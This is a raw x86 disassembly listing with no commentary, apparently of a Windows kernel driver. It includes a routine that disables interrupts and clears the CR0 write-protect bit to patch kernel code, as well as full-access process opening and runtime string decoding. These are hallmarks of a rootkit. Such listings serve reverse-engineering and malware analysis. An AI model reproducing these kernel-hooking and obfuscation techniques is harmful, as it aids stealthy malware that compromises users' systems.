   1819b:	push   esi
   1819c:	push   edi
   1819d:	lea    eax,[ebp-0x83c]
   181a3:	push   eax
   181a4:	call   0x1a08e
   181a9:	mov    BYTE PTR [ebp-0x83c],bl
   181af:	mov    eax,DWORD PTR [ebp-0x838]
   181b5:	mov    DWORD PTR [ebp-0x824],eax
   181bb:	cmp    eax,ebx
   181bd:	je     0x181d8
   181bf:	push   DWORD PTR [ebp-0x828]
   181c5:	push   eax
   181c6:	call   0x17ab2
   181cb:	test   al,al
   181cd:	je     0x181d8
   181cf:	mov    BYTE PTR [ebp-0x81d],0x1
   181d6:	jmp    0x181e6
   181d8:	mov    BYTE PTR [ebp-0x81d],0x1
   181df:	mov    BYTE PTR [ebp-0x81e],0x1
   181e6:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   181ed:	jmp    0x181ff
   181ef:	xor    eax,eax
   181f1:	inc    eax
   181f2:	ret    
   181f3:	mov    esp,DWORD PTR [ebp-0x18]
   181f6:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   181fd:	xor    ebx,ebx
   181ff:	push   DWORD PTR [ebp-0x82c]
   18205:	call   DWORD PTR ds:0x1f060
   1820b:	cmp    BYTE PTR [ebp-0x81e],bl
   18211:	je     0x18236
   18213:	push   DWORD PTR [ebp-0x880]
   18219:	push   DWORD PTR [ebp-0x884]
   1821f:	push   DWORD PTR [ebp-0x828]
   18225:	push   DWORD PTR [ebp-0x824]
   1822b:	call   0x17ce6
   18230:	mov    BYTE PTR [ebp-0x81d],al
   18236:	cmp    DWORD PTR [ebp-0x824],ebx
   1823c:	je     0x1824a
   1823e:	push   DWORD PTR [ebp-0x824]
   18244:	call   0x10a9a
   18249:	pop    ecx
   1824a:	mov    al,BYTE PTR [ebp-0x81d]
   18250:	call   0x1de68
   18255:	ret    
   18256:	int3   
   18257:	int3   
   18258:	int3   
   18259:	int3   
   1825a:	int3   
   1825b:	int3   
   1825c:	mov    edi,edi
   1825e:	push   ebp
   1825f:	mov    ebp,esp
   18261:	sub    esp,0xbc
   18267:	mov    eax,ds:0x7eb38
   1826c:	xor    eax,ebp
   1826e:	mov    DWORD PTR [ebp-0x4],eax
   18271:	push   ebx
   18272:	push   edi
   18273:	push   0x1e956
   18278:	push   0xb
   1827a:	push   0x1e93e
   1827f:	call   0x16c9e
   18284:	push   eax
   18285:	lea    eax,[ebp-0xbc]
   1828b:	push   eax
   1828c:	call   0x11c5c
   18291:	call   eax
   18293:	xor    eax,eax
   18295:	lea    edi,[ebp-0xb0]
   1829b:	stos   DWORD PTR es:[edi],eax
   1829c:	stos   DWORD PTR es:[edi],eax
   1829d:	stos   DWORD PTR es:[edi],eax
   1829e:	stos   DWORD PTR es:[edi],eax
   1829f:	xor    ebx,ebx
   182a1:	push   ebx
   182a2:	stos   DWORD PTR es:[edi],eax
   182a3:	push   ebx
   182a4:	push   ebx
   182a5:	push   0x1
   182a7:	xor    eax,eax
   182a9:	push   0x7
   182ab:	push   ebx
   182ac:	mov    DWORD PTR [ebp-0x94],ebx
   182b2:	lea    edi,[ebp-0x90]
   182b8:	stos   DWORD PTR es:[edi],eax
   182b9:	lea    eax,[ebp-0xbc]
   182bf:	mov    DWORD PTR [ebp-0xac],eax
   182c5:	push   ebx
   182c6:	lea    eax,[ebp-0x94]
   182cc:	push   eax
   182cd:	lea    eax,[ebp-0xb4]
   182d3:	push   eax
   182d4:	push   0x89
   182d9:	lea    eax,[ebp-0x8c]
   182df:	push   eax
   182e0:	mov    DWORD PTR [ebp-0x8c],ebx
   182e6:	mov    DWORD PTR [ebp-0xb4],0x18
   182f0:	mov    DWORD PTR [ebp-0xb0],ebx
   182f6:	mov    DWORD PTR [ebp-0xa8],0x240
   18300:	mov    DWORD PTR [ebp-0xa4],ebx
   18306:	mov    DWORD PTR [ebp-0xa0],ebx
   1830c:	call   0x1186c
   18311:	call   eax
   18313:	test   eax,eax
   18315:	jge    0x1831e
   18317:	xor    al,al
   18319:	jmp    0x183f5
   1831e:	push   esi
   1831f:	mov    esi,0x20c
   18324:	push   esi
   18325:	call   0x10a66
   1832a:	pop    ecx
   1832b:	push   ebx
   1832c:	push   ebx
   1832d:	push   esi
   1832e:	mov    edi,eax
   18330:	push   edi
   18331:	lea    eax,[ebp-0x94]
   18337:	push   eax
   18338:	push   ebx
   18339:	push   ebx
   1833a:	push   ebx
   1833b:	lea    eax,[ebp-0x8c]
   18341:	cmp    edi,ebx
   18343:	push   eax
   18344:	setne  BYTE PTR [ebp-0x9c]
   1834b:	call   0x11ab8
   18350:	call   eax
   18352:	push   0x1
   18354:	push   esi
   18355:	push   edi
   18356:	lea    eax,[ebp-0x94]
   1835c:	push   eax
   1835d:	push   DWORD PTR [ebp-0x8c]
   18363:	call   0x11842
   18368:	call   eax
   1836a:	push   DWORD PTR [ebp-0x8c]
   18370:	mov    esi,eax
   18372:	call   DWORD PTR ds:0x1f060
   18378:	cmp    esi,ebx
   1837a:	pop    esi
   1837b:	jge    0x1838e
   1837d:	cmp    BYTE PTR [ebp-0x9c],bl
   18383:	je     0x18317
   18385:	push   edi
   18386:	call   0x10a9a
   1838b:	pop    ecx
   1838c:	jmp    0x18317
   1838e:	push   0x7
   18390:	push   0x1
   18392:	lea    eax,[ebp-0x84]
   18398:	push   eax
   18399:	push   DWORD PTR [edi+0x8]
   1839c:	call   0x10810
   183a1:	mov    ecx,0x7e208
   183a6:	lea    eax,[ebp-0x84]
   183ac:	mov    dx,WORD PTR [eax]
   183af:	cmp    dx,WORD PTR [ecx]
   183b2:	jne    0x183d2
   183b4:	cmp    dx,bx
   183b7:	je     0x183ce
   183b9:	mov    dx,WORD PTR [eax+0x2]
   183bd:	cmp    dx,WORD PTR [ecx+0x2]
   183c1:	jne    0x183d2
   183c3:	add    eax,0x4
   183c6:	add    ecx,0x4
   183c9:	cmp    dx,bx
   183cc:	jne    0x183ac
   183ce:	xor    eax,eax
   183d0:	jmp    0x183d7
   183d2:	sbb    eax,eax
   183d4:	sbb    eax,0xffffffff
   183d7:	cmp    eax,ebx
   183d9:	sete   BYTE PTR [ebp-0x85]
   183e0:	cmp    BYTE PTR [ebp-0x9c],bl
   183e6:	je     0x183ef
   183e8:	push   edi
   183e9:	call   0x10a9a
   183ee:	pop    ecx
   183ef:	mov    al,BYTE PTR [ebp-0x85]
   183f5:	mov    ecx,DWORD PTR [ebp-0x4]
   183f8:	pop    edi
   183f9:	xor    ecx,ebp
   183fb:	pop    ebx
   183fc:	call   0x1da79
   18401:	leave  
   18402:	ret    
   18403:	int3   
   18404:	int3   
   18405:	int3   
   18406:	int3   
   18407:	int3   
   18408:	push   0x0
   1840a:	push   0x19
   1840c:	call   0x109f0
   18411:	test   edx,edx
   18413:	jl     0x18450
   18415:	jg     0x1841c
   18417:	cmp    eax,0x3
   1841a:	jbe    0x18450
   1841c:	mov    DWORD PTR ds:0x7eb24,0x2
   18426:	call   0x1a22c
   1842b:	push   0x1e9f6
   18430:	push   0x34
   18432:	push   0x1e98c
   18437:	call   0x16c9e
   1843c:	mov    edx,0x7e2c8
   18441:	movzx  ecx,WORD PTR [eax]
   18444:	inc    eax
   18445:	mov    WORD PTR [edx],cx
   18448:	inc    eax
   18449:	inc    edx
   1844a:	inc    edx
   1844b:	test   cx,cx
   1844e:	jne    0x18441
   18450:	ret    
   18451:	int3   
   18452:	int3   
   18453:	int3   
   18454:	int3   
   18455:	int3   
   18456:	mov    edi,edi
   18458:	push   ebp
   18459:	mov    ebp,esp
   1845b:	push   esi
   1845c:	mov    esi,ecx
   1845e:	lea    ecx,[esi+0x4]
   18461:	mov    DWORD PTR [esi],0x7a2fc
   18467:	mov    BYTE PTR [ecx+0x8],0x0
   1846b:	call   0x146a2
   18470:	lea    ecx,[esi+0x14]
   18473:	mov    BYTE PTR [ecx+0x8],0x0
   18477:	call   0x144f0
   1847c:	mov    eax,DWORD PTR [ebp+0x8]
   1847f:	mov    DWORD PTR [esi+0x24],eax
   18482:	mov    eax,DWORD PTR [ebp+0xc]
   18485:	mov    DWORD PTR [esi+0x28],eax
   18488:	mov    eax,esi
   1848a:	pop    esi
   1848b:	pop    ebp
   1848c:	ret    0x8
   1848f:	int3   
   18490:	int3   
   18491:	int3   
   18492:	int3   
   18493:	int3   
   18494:	mov    edi,edi
   18496:	push   esi
   18497:	mov    esi,ecx
   18499:	lea    ecx,[esi+0x14]
   1849c:	mov    DWORD PTR [esi],0x7a2fc
   184a2:	call   0x160fe
   184a7:	lea    ecx,[esi+0x4]
   184aa:	pop    esi
   184ab:	jmp    0x16aac
   184b0:	int3   
   184b1:	int3   
   184b2:	int3   
   184b3:	int3   
   184b4:	int3   
   184b5:	int3   
   184b6:	mov    edi,edi
   184b8:	push   ebp
   184b9:	mov    ebp,esp
   184bb:	sub    esp,0x124
   184c1:	push   ebx
   184c2:	push   esi
   184c3:	push   edi
   184c4:	mov    esi,ecx
   184c6:	call   0x16fae
   184cb:	push   DWORD PTR [ebp+0x8]
   184ce:	lea    eax,[ebp-0x4]
   184d1:	lea    edi,[esi+0x4]
   184d4:	push   eax
   184d5:	mov    ecx,edi
   184d7:	call   0x13d2e
   184dc:	mov    ebx,DWORD PTR [ebp-0x4]
   184df:	cmp    ebx,DWORD PTR [esi+0x8]
   184e2:	je     0x1852d
   184e4:	mov    eax,DWORD PTR [esi+0x18]
   184e7:	lea    ecx,[ebp+0x8]
   184ea:	mov    DWORD PTR [ebp+0x8],eax
   184ed:	call   0x13d0e
   184f2:	mov    edi,DWORD PTR [eax]
   184f4:	lea    eax,[ebx+0x68]
   184f7:	add    esi,0x14
   184fa:	inc    edi
   184fb:	push   eax
   184fc:	mov    ecx,esi
   184fe:	mov    DWORD PTR [ebp+0x8],edi
   18501:	mov    DWORD PTR [ebp-0x4],eax
   18504:	call   0x14de8
   18509:	lea    eax,[ebp+0x8]
   1850c:	push   eax
   1850d:	lea    eax,[ebp-0xc]
   18510:	push   eax
   18511:	mov    ecx,esi
   18513:	call   0x160d4
   18518:	push   DWORD PTR [ebp+0xc]
   1851b:	lea    ecx,[ebx+0x18]
   1851e:	call   0x12a5a
   18523:	mov    eax,DWORD PTR [ebp-0x4]
   18526:	mov    DWORD PTR [eax],edi
   18528:	jmp    0x185c2
   1852d:	lea    ecx,[ebp-0x64]
   18530:	call   0x136d8
   18535:	xor    eax,eax
   18537:	cmp    DWORD PTR [esi+0x20],eax
   1853a:	je     0x1854d
   1853c:	mov    eax,DWORD PTR [esi+0x18]
   1853f:	lea    ecx,[ebp-0x4]
   18542:	mov    DWORD PTR [ebp-0x4],eax
   18545:	call   0x13d0e
   1854a:	mov    eax,DWORD PTR [eax]
   1854c:	inc    eax
   1854d:	push   DWORD PTR [ebp+0xc]
   18550:	lea    ecx,[ebp-0x64]
   18553:	mov    DWORD PTR [ebp-0x4],eax
   18556:	mov    DWORD PTR [ebp-0x14],eax
   18559:	call   0x12a5a
   1855e:	lea    eax,[ebp-0x64]
   18561:	push   eax
   18562:	push   DWORD PTR [ebp+0x8]
   18565:	lea    ecx,[ebp-0x124]
   1856b:	call   0x135e0
   18570:	lea    eax,[ebp-0x124]
   18576:	push   eax
   18577:	lea    ecx,[ebp-0xc4]
   1857d:	call   0x13a10
   18582:	lea    eax,[ebp-0xc4]
   18588:	push   eax
   18589:	lea    eax,[ebp-0xc]
   1858c:	push   eax
   1858d:	mov    ecx,edi
   1858f:	call   0x16a82
   18594:	lea    ecx,[ebp-0xc4]
   1859a:	call   0x12ae0
   1859f:	lea    ecx,[ebp-0x124]
   185a5:	call   0x12ae0
   185aa:	lea    eax,[ebp-0x4]
   185ad:	push   eax
   185ae:	lea    eax,[ebp-0xc]
   185b1:	push   eax
   185b2:	lea    ecx,[esi+0x14]
   185b5:	call   0x160d4
   185ba:	lea    ecx,[ebp-0x64]
   185bd:	call   0x11ece
   185c2:	pop    edi
   185c3:	pop    esi
   185c4:	pop    ebx
   185c5:	leave  
   185c6:	ret    0x8
   185c9:	int3   
   185ca:	int3   
   185cb:	int3   
   185cc:	int3   
   185cd:	int3   
   185ce:	mov    edi,edi
   185d0:	push   ebp
   185d1:	mov    ebp,esp
   185d3:	sub    esp,0x10
   185d6:	call   0x1a2b0
   185db:	test   al,al
   185dd:	jne    0x185e7
   185df:	mov    eax,DWORD PTR [ebp+0x8]
   185e2:	jmp    0x1867b
   185e7:	push   esi
   185e8:	mov    esi,DWORD PTR [ebp+0x8]
   185eb:	push   0xffffffff
   185ed:	push   esi
   185ee:	lea    ecx,[ebp-0x8]
   185f1:	call   0x11152
   185f6:	mov    ecx,DWORD PTR ds:0x7f860
   185fc:	lea    eax,[ebp-0x8]
   185ff:	push   eax
   18600:	lea    eax,[ebp+0x8]
   18603:	push   eax
   18604:	call   0x1421e
   18609:	mov    eax,DWORD PTR [ebp+0x8]
   1860c:	mov    ecx,DWORD PTR ds:0x7f860
   18612:	cmp    eax,DWORD PTR [ecx+0x4]
   18615:	jne    0x18646
   18617:	lea    eax,[ebp-0x8]
   1861a:	push   eax
   1861b:	lea    ecx,[ebp-0x10]
   1861e:	call   0x12b3a
   18623:	mov    ecx,DWORD PTR ds:0x7f860
   18629:	lea    eax,[ebp-0x10]
   1862c:	push   eax
   1862d:	lea    eax,[ebp-0x8]
   18630:	push   eax
   18631:	call   0x17060
   18636:	mov    ecx,eax
   18638:	call   0x12b5c
   1863d:	push   DWORD PTR [ebp-0x10]
   18640:	call   0x10a9a
   18645:	pop    ecx
   18646:	mov    ecx,DWORD PTR ds:0x7f860
   1864c:	lea    eax,[ebp-0x8]
   1864f:	push   eax
   18650:	lea    eax,[ebp+0x8]
   18653:	push   eax
   18654:	call   0x1421e
   18659:	mov    eax,DWORD PTR [ebp+0x8]
   1865c:	mov    ecx,DWORD PTR ds:0x7f860
   18662:	cmp    eax,DWORD PTR [ecx+0x4]
   18665:	je     0x1866a
   18667:	mov    esi,DWORD PTR [eax+0x14]
   1866a:	call   0x1a218
   1866f:	push   DWORD PTR [ebp-0x8]
   18672:	call   0x10a9a
   18677:	pop    ecx
   18678:	mov    eax,esi
   1867a:	pop    esi
   1867b:	leave  
   1867c:	ret    0x4
   1867f:	int3   
   18680:	int3   
   18681:	int3   
   18682:	int3   
   18683:	int3   
   18684:	mov    edi,edi
   18686:	push   ebp
   18687:	mov    ebp,esp
   18689:	push   esi
   1868a:	mov    esi,ecx
   1868c:	call   0x18494
   18691:	test   BYTE PTR [ebp+0x8],0x1
   18695:	je     0x1869e
   18697:	push   esi
   18698:	call   0x10a9a
   1869d:	pop    ecx
   1869e:	mov    eax,esi
   186a0:	pop    esi
   186a1:	pop    ebp
   186a2:	ret    0x4
   186a5:	int3   
   186a6:	int3   
   186a7:	int3   
   186a8:	int3   
   186a9:	int3   
   186aa:	mov    edi,edi
   186ac:	push   ebp
   186ad:	mov    ebp,esp
   186af:	push   esi
   186b0:	push   DWORD PTR [ebp+0xc]
   186b3:	mov    esi,ecx
   186b5:	push   DWORD PTR [ebp+0x8]
   186b8:	call   0x18456
   186bd:	mov    eax,esi
   186bf:	pop    esi
   186c0:	pop    ebp
   186c1:	ret    0x8
   186c4:	int3   
   186c5:	int3   
   186c6:	int3   
   186c7:	int3   
   186c8:	int3   
   186c9:	int3   
   186ca:	push   0x33c
   186cf:	push   0x7e008
   186d4:	call   0x1de20
   186d9:	mov    esi,DWORD PTR [ebp+0xc]
   186dc:	mov    DWORD PTR [ebp-0x32c],esi
   186e2:	call   DWORD PTR ds:0x1f000
   186e8:	xor    ebx,ebx
   186ea:	cmp    BYTE PTR [ebp+0x10],bl
   186ed:	jne    0x1872b
   186ef:	push   esi
   186f0:	mov    ecx,DWORD PTR ds:0x7eb68
   186f6:	call   0x15e78
   186fb:	mov    edi,eax
   186fd:	push   esi
   186fe:	mov    ecx,DWORD PTR ds:0x7eb68
   18704:	call   0x166b0
   18709:	mov    eax,edi
   1870b:	dec    eax
   1870c:	je     0x18720
   1870e:	dec    eax
   1870f:	je     0x1871c
   18711:	dec    eax
   18712:	jne    0x18905
   18718:	push   0xa
   1871a:	jmp    0x18721
   1871c:	push   0x2
   1871e:	jmp    0x18721
   18720:	push   ebx
   18721:	call   0x10ff6
   18726:	jmp    0x18905
   1872b:	mov    DWORD PTR [ebp-0x320],ebx
   18731:	xor    eax,eax
   18733:	lea    edi,[ebp-0x326]
   18739:	stos   DWORD PTR es:[edi],eax
   1873a:	stos   WORD PTR es:[edi],ax
   1873c:	xor    eax,eax
   1873e:	mov    WORD PTR [ebp-0x21c],ax
   18745:	push   0x1fc
   1874a:	push   ebx
   1874b:	lea    eax,[ebp-0x21a]
   18751:	push   eax
   18752:	call   0x1daf6
   18757:	add    esp,0xc
   1875a:	lea    eax,[ebp-0x21c]
   18760:	mov    DWORD PTR [ebp-0x324],eax
   18766:	xor    eax,eax
   18768:	mov    WORD PTR [ebp-0x328],ax
   1876f:	mov    eax,0x1fe
   18774:	mov    WORD PTR [ebp-0x326],ax
   1877b:	mov    DWORD PTR [ebp-0x34c],0x18
   18785:	mov    DWORD PTR [ebp-0x348],ebx
   1878b:	mov    DWORD PTR [ebp-0x340],0x200
   18795:	mov    DWORD PTR [ebp-0x344],ebx
   1879b:	mov    DWORD PTR [ebp-0x33c],ebx
   187a1:	mov    DWORD PTR [ebp-0x338],ebx
   187a7:	mov    DWORD PTR [ebp-0x334],esi
   187ad:	mov    DWORD PTR [ebp-0x330],ebx
   187b3:	lea    eax,[ebp-0x334]
   187b9:	push   eax
   187ba:	lea    eax,[ebp-0x34c]
   187c0:	push   eax
   187c1:	push   0x1f0fff
   187c6:	lea    eax,[ebp-0x320]
   187cc:	push   eax
   187cd:	call   0x1169e
   187d2:	call   eax
   187d4:	test   eax,eax
   187d6:	jl     0x18905
   187dc:	lea    eax,[ebp-0x328]
   187e2:	push   eax
   187e3:	push   DWORD PTR [ebp-0x320]
   187e9:	call   0x11f9a
   187ee:	cmp    eax,ebx
   187f0:	jl     0x188f9
   187f6:	movzx  eax,WORD PTR [ebp-0x328]
   187fd:	shr    eax,1
   187ff:	xor    ecx,ecx
   18801:	mov    WORD PTR [ebp+eax*2-0x21c],cx
   18809:	push   DWORD PTR [ebp-0x320]
   1880f:	call   0x1202c
   18814:	lea    eax,[ebp-0x21c]
   1881a:	push   eax
   1881b:	call   0x10dd4
   18820:	cmp    eax,ebx
   18822:	je     0x18847
   18824:	push   eax
   18825:	push   esi
   18826:	mov    ecx,DWORD PTR ds:0x7eb68
   1882c:	call   0x16c5c
   18831:	push   DWORD PTR [ebp-0x320]
   18837:	push   DWORD PTR [ebp-0x320]
   1883d:	call   0x1202c
   18842:	push   eax
   18843:	push   esi
   18844:	push   ebx
   18845:	jmp    0x188c5
   18847:	push   0x1ea34
   1884c:	push   0x9
   1884e:	push   0x1ea20
   18853:	call   0x16c9e
   18858:	push   eax
   18859:	lea    eax,[ebp-0x328]
   1885f:	push   eax
   18860:	call   0x10e16
   18865:	test   al,al
   18867:	je     0x188cc
   18869:	cmp    DWORD PTR ds:0x7f83c,ebx
   1886f:	jne    0x188a2
   18871:	mov    DWORD PTR ds:0x7f83c,0x1
   1887b:	mov    DWORD PTR [ebp-0x4],ebx
   1887e:	call   0x17f92
   18883:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   1888a:	jmp    0x188a2
   1888c:	xor    eax,eax
   1888e:	inc    eax
   1888f:	ret    
   18890:	mov    esp,DWORD PTR [ebp-0x18]
   18893:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   1889a:	xor    ebx,ebx
   1889c:	mov    esi,DWORD PTR [ebp-0x32c]
   188a2:	cmp    DWORD PTR ds:0x7edbc,ebx
   188a8:	jne    0x188b0
   188aa:	mov    DWORD PTR ds:0x7edbc,esi
   188b0:	push   DWORD PTR [ebp-0x320]
   188b6:	push   DWORD PTR [ebp-0x320]
   188bc:	call   0x1202c
   188c1:	push   eax
   188c2:	push   esi
   188c3:	push   0x1
   188c5:	call   0x137f0
   188ca:	jmp    0x188f9
   188cc:	lea    eax,[ebp-0x31c]
   188d2:	push   eax
   188d3:	call   0x10fa6
   188d8:	test   al,al
   188da:	je     0x188f9
   188dc:	lea    eax,[ebp-0x31c]
   188e2:	push   eax
   188e3:	lea    eax,[ebp-0x328]
   188e9:	push   eax
   188ea:	call   0x10e16
   188ef:	test   al,al
   188f1:	je     0x188f9
   188f3:	push   esi
   188f4:	call   0x1205c
   188f9:	push   DWORD PTR [ebp-0x320]
   188ff:	call   DWORD PTR ds:0x1f060
   18905:	call   0x1de68
   1890a:	ret    0xc
   1890d:	int3   
   1890e:	int3   
   1890f:	int3   
   18910:	int3   
   18911:	int3   
   18912:	mov    edi,edi
   18914:	push   ebp
   18915:	mov    ebp,esp
   18917:	push   ecx
   18918:	cli    
   18919:	mov    eax,cr0
   1891c:	mov    DWORD PTR [ebp-0x4],eax
   1891f:	nop
   18920:	and    eax,0xfffeffff
   18925:	mov    cr0,eax
   18928:	push   0x17772
   1892d:	push   DWORD PTR ds:0x7ed04
   18933:	call   0x198dc
   18938:	push   0x1765e
   1893d:	mov    ds:0x7ed08,eax
   18942:	call   0x116c8
   18947:	call   eax
   18949:	push   0x0
   1894b:	push   0x186ca
   18950:	call   0x1171c
   18955:	call   eax
   18957:	mov    eax,DWORD PTR [ebp-0x4]
   1895a:	mov    cr0,eax
   1895d:	sti    
   1895e:	leave  
   1895f:	ret    
   18960:	int3   
   18961:	int3   
   18962:	int3   
   18963:	int3   
   18964:	int3   
   18965:	int3   
   18966:	mov    edi,edi
   18968:	push   ebp
   18969:	mov    ebp,esp
   1896b:	sub    esp,0x50
   1896e:	push   ebx
   1896f:	mov    ebx,DWORD PTR [ebp+0x8]
   18972:	push   esi
   18973:	test   bl,0x20
   18976:	je     0x189b9
   18978:	push   DWORD PTR [ebp+0x30]
   1897b:	mov    esi,DWORD PTR ds:0x7ed00
   18981:	push   DWORD PTR [ebp+0x2c]
   18984:	lea    ecx,[ebp-0x50]
   18987:	push   DWORD PTR [ebp+0x28]
   1898a:	push   DWORD PTR [ebp+0x24]
   1898d:	push   DWORD PTR [ebp+0x20]
   18990:	push   DWORD PTR [ebp+0x1c]
   18993:	push   DWORD PTR [ebp+0x14]
   18996:	push   DWORD PTR [ebp+0x10]
   18999:	push   DWORD PTR [ebp+0xc]
   1899c:	call   0x1373c
   189a1:	push   eax
   189a2:	push   DWORD PTR [ebp+0xc]
   189a5:	mov    ecx,esi
   189a7:	call   0x184b6
   189ac:	lea    ecx,[ebp-0x50]
   189af:	call   0x11ece
   189b4:	jmp    0x18afe
   189b9:	push   DWORD PTR [ebp+0xc]
   189bc:	mov    ecx,DWORD PTR ds:0x7ecf8
   189c2:	call   0x1617a
   189c7:	test   eax,eax
   189c9:	jne    0x189d7
   189cb:	test   bl,0x1
   189ce:	jne    0x189d7
   189d0:	xor    al,al
   189d2:	jmp    0x18b00
   189d7:	push   DWORD PTR [ebp+0xc]
   189da:	mov    ecx,DWORD PTR ds:0x7ecf8
   189e0:	call   0x16ea4
   189e5:	mov    esi,eax
   189e7:	test   bl,0x1
   189ea:	je     0x18a34
   189ec:	mov    eax,DWORD PTR [ebp+0x28]
   189ef:	push   DWORD PTR [ebp+0xc]
   189f2:	mov    ecx,esi
   189f4:	mov    DWORD PTR [esi+0x2c],eax
   189f7:	call   0x129cc
   189fc:	push   DWORD PTR [ebp+0x10]
   189ff:	lea    ecx,[esi+0x8]
   18a02:	call   0x129cc
   18a07:	mov    eax,DWORD PTR [ebp+0x14]
   18a0a:	push   DWORD PTR [ebp+0x18]
   18a0d:	lea    ecx,[esi+0x14]
   18a10:	mov    DWORD PTR [esi+0x10],eax
   18a13:	call   0x129cc
   18a18:	push   DWORD PTR [ebp+0x1c]
   18a1b:	lea    ecx,[esi+0x1c]
   18a1e:	call   0x129cc
   18a23:	push   DWORD PTR [ebp+0x20]
   18a26:	lea    ecx,[esi+0x24]
   18a29:	call   0x129cc
   18a2e:	mov    eax,DWORD PTR [ebp+0x2c]
   18a31:	mov    DWORD PTR [esi+0x30],eax
   18a34:	mov    DWORD PTR [ebp+0x28],ebx
   18a37:	and    DWORD PTR [ebp+0x28],0x2
   18a3b:	je     0x18a4b
   18a3d:	mov    eax,DWORD PTR [ebp+0x30]
   18a40:	mov    ecx,DWORD PTR [eax]
   18a42:	mov    DWORD PTR [esi+0x38],ecx
   18a45:	mov    eax,DWORD PTR [eax+0x4]
   18a48:	mov    DWORD PTR [esi+0x3c],eax
   18a4b:	mov    DWORD PTR [ebp+0x10],ebx
   18a4e:	and    DWORD PTR [ebp+0x10],0x4
   18a52:	je     0x18a62
   18a54:	mov    eax,DWORD PTR [ebp+0x34]
   18a57:	mov    ecx,DWORD PTR [eax]
   18a59:	mov    DWORD PTR [esi+0x40],ecx
   18a5c:	mov    eax,DWORD PTR [eax+0x4]
   18a5f:	mov    DWORD PTR [esi+0x44],eax
   18a62:	test   bl,0x10
   18a65:	je     0x18afe
   18a6b:	cmp    DWORD PTR [esi+0x18],0x0
   18a6f:	jbe    0x18afe
   18a75:	mov    eax,ds:0x7ecf8
   18a7a:	mov    eax,DWORD PTR [eax+0x4]
   18a7d:	push   edi
   18a7e:	mov    edi,DWORD PTR [eax]
   18a80:	mov    DWORD PTR [ebp+0x14],edi
   18a83:	cmp    edi,eax
   18a85:	je     0x18afd
   18a87:	push   DWORD PTR [ebp+0xc]
   18a8a:	lea    ebx,[edi+0x10]
   18a8d:	push   ebx
   18a8e:	call   0x19824
   18a93:	test   al,al
   18a95:	je     0x18ae8
   18a97:	lea    eax,[esi+0x14]
   18a9a:	push   eax
   18a9b:	add    edi,0x2c
   18a9e:	push   edi
   18a9f:	call   0x19814
   18aa4:	test   al,al
   18aa6:	je     0x18ae8
   18aa8:	cmp    DWORD PTR [ebp+0x28],0x0
   18aac:	je     0x18ac8
   18aae:	mov    ecx,DWORD PTR ds:0x7ecf8
   18ab4:	push   ebx
   18ab5:	call   0x16ea4
   18aba:	mov    ecx,DWORD PTR [ebp+0x30]
   18abd:	mov    edx,DWORD PTR [ecx]
   18abf:	mov    DWORD PTR [eax+0x38],edx
   18ac2:	mov    ecx,DWORD PTR [ecx+0x4]
   18ac5:	mov    DWORD PTR [eax+0x3c],ecx
   18ac8:	cmp    DWORD PTR [ebp+0x10],0x0
   18acc:	je     0x18ae8
   18ace:	mov    ecx,DWORD PTR ds:0x7ecf8
   18ad4:	push   ebx
   18ad5:	call   0x16ea4
   18ada:	mov    ecx,DWORD PTR [ebp+0x34]
   18add:	mov    edx,DWORD PTR [ecx]
   18adf:	mov    DWORD PTR [eax+0x40],edx
   18ae2:	mov    ecx,DWORD PTR [ecx+0x4]
   18ae5:	mov    DWORD PTR [eax+0x44],ecx
   18ae8:	lea    ecx,[ebp+0x14]
   18aeb:	call   0x1387e
   18af0:	mov    edi,DWORD PTR [ebp+0x14]
   18af3:	mov    eax,ds:0x7ecf8
   18af8:	cmp    edi,DWORD PTR [eax+0x4]
   18afb:	jne    0x18a87
   18afd:	pop    edi
   18afe:	mov    al,0x1
   18b00:	pop    esi
   18b01:	pop    ebx
   18b02:	leave  
   18b03:	ret    0x30
   18b06:	int3   
   18b07:	int3   
   18b08:	int3   
   18b09:	int3   
   18b0a:	int3   
   18b0b:	int3   
   18b0c:	push   0x4c
   18b0e:	push   0x7e028
   18b13:	call   0x1db1c
   18b18:	xor    esi,esi
   18b1a:	push   esi
   18b1b:	push   esi
   18b1c:	push   esi
   18b1d:	push   esi
   18b1e:	push   0x7eb70
   18b23:	call   DWORD PTR ds:0x1f028
   18b29:	cmp    eax,esi
   18b2b:	jge    0x18b3c
   18b2d:	mov    eax,DWORD PTR [ebp+0x8]
   18b30:	mov    DWORD PTR [eax+0x8],0x4
   18b37:	jmp    0x18c71
   18b3c:	mov    DWORD PTR [ebp-0x4],esi
   18b3f:	or     ebx,0xffffffff
   18b42:	push   ebx
   18b43:	mov    esi,DWORD PTR [ebp+0x8]
   18b46:	lea    eax,[esi+0x28]
   18b49:	push   eax
   18b4a:	lea    ecx,[ebp-0x44]
   18b4d:	call   0x1298a
   18b52:	mov    edi,DWORD PTR [ebp-0x40]
   18b55:	inc    edi
   18b56:	push   ebx
   18b57:	lea    eax,[edi+esi*1+0x28]
   18b5b:	push   eax
   18b5c:	lea    ecx,[ebp-0x3c]
   18b5f:	call   0x1298a
   18b64:	mov    eax,DWORD PTR [ebp-0x38]
   18b67:	lea    edi,[edi+eax*1+0x1]
   18b6b:	mov    eax,DWORD PTR [edi+esi*1+0x28]
   18b6f:	mov    DWORD PTR [ebp-0x1c],eax
   18b72:	add    edi,0x4
   18b75:	push   ebx
   18b76:	lea    eax,[edi+esi*1+0x28]
   18b7a:	push   eax
   18b7b:	lea    ecx,[ebp-0x34]
   18b7e:	call   0x1298a
   18b83:	mov    eax,DWORD PTR [ebp-0x30]
   18b86:	lea    edi,[edi+eax*1+0x1]
   18b8a:	push   ebx
   18b8b:	lea    eax,[edi+esi*1+0x28]
   18b8f:	push   eax
   18b90:	lea    ecx,[ebp-0x2c]
   18b93:	call   0x1298a
   18b98:	mov    eax,DWORD PTR [ebp-0x28]
   18b9b:	lea    edi,[edi+eax*1+0x1]
   18b9f:	push   ebx
   18ba0:	lea    eax,[edi+esi*1+0x28]
   18ba4:	push   eax
   18ba5:	lea    ecx,[ebp-0x24]
   18ba8:	call   0x1298a
   18bad:	mov    eax,DWORD PTR [ebp-0x20]
   18bb0:	lea    eax,[edi+eax*1+0x1]
   18bb4:	push   ebx
   18bb5:	lea    eax,[eax+esi*1+0x28]
   18bb9:	push   eax
   18bba:	lea    ecx,[ebp-0x5c]
   18bbd:	call   0x1298a
   18bc2:	mov    eax,DWORD PTR [esi+0xc]
   18bc5:	mov    ecx,DWORD PTR [esi+0x18]
